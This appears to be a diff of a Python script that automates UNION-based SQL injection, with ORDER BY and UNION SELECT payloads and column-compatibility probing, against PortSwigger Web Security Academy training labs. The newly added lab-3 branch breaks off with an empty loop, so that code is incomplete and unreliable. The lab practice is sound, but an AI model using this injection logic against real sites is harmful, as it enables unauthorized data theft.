@@ -2,7 +2,7 @@
 #replace url with lab url similar to one seen below
 import requests
 #url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'
-url = 'https://ac561ff51ed65b1080642136008a006f.web-security-academy.net/filter?category=Accessories'
+url = 'https://ac961f3b1e0d5ca28005bf7c0039009a.web-security-academy.net/filter?category=Accessories'
 sqli_row = ["'+ORDER+BY+",
             "'+UNION+SELECT+"]
 used_attack_r = []
@@ -45,10 +45,11 @@ def check_columns():
         if r.status_code == 200:
             compatible_col.append(x)
             print("Column %s is comaptible" % str(x+1))
+    split = final_attack.split(",")
     for each in compatible_col:
-        split = final_attack.split(",")
         split[each] = split[each].replace('NULL', "'a'")
     final_attack = (',').join(split)
+    #print(final_attack)
 
 def pass_lab_check():
     if lab == 1:
@@ -61,7 +62,10 @@ def pass_lab_check():
         r = session.get(url=final_attack.replace("'a'","'drYPYM'"))#replace with required string from lab2
         if "Congratulations, you solved the lab!" in r.text:
             print("lab 2 passed")
-
+    elif lab == 3:
+        split = final_attack.split(",")
+        for each in compatible_col:
+            
 def main():
     find_rows()
     if lab != 1:
